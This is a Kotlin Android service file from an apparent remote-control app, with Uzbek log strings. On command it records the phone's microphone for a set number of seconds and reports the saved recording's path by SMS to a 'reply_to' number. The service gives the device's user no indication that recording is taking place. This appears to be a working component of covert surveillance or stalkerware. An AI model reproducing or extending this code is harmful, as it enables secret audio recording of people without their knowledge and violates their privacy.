package com.example.remotecontrol

import android.app.Service
import android.content.Intent
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class AudioRecordService : Service() {

    private var recorder: MediaRecorder? = null
    private lateinit var replyTo: String
    private var seconds: Int = 30

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        replyTo = intent?.getStringExtra("reply_to") ?: ""
        seconds = intent?.getIntExtra("seconds", 30) ?: 30
        startRecording()
        return START_NOT_STICKY
    }

    private fun startRecording() {
        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val file = File(getExternalFilesDir(null), "RC_audio_$timestamp.mp4")

            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            Log.d("AudioRecordService", "Yozish boshlandi: ${file.name}")

            android.os.Handler(mainLooper).postDelayed({
                stopRecording(file)
            }, (seconds * 1000).toLong())

        } catch (e: Exception) {
            Log.e("AudioRecordService", "Xato: ${e.message}")
            CommandHandler(this).sendSms(replyTo, "❌ Audio yozish xatosi: ${e.message}")
            stopSelf()
        }
    }

    private fun stopRecording(file: File) {
        try {
            recorder?.apply { stop(); release() }
            recorder = null
            CommandHandler(this).sendSms(replyTo, "🎙️ Audio yozildi: ${file.name} (${seconds}s)\nYo'l: ${file.absolutePath}")
            Log.d("AudioRecordService", "Yozish tugadi.")
        } catch (e: Exception) {
            Log.e("AudioRecordService", "Stop xato: ${e.message}")
        }
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
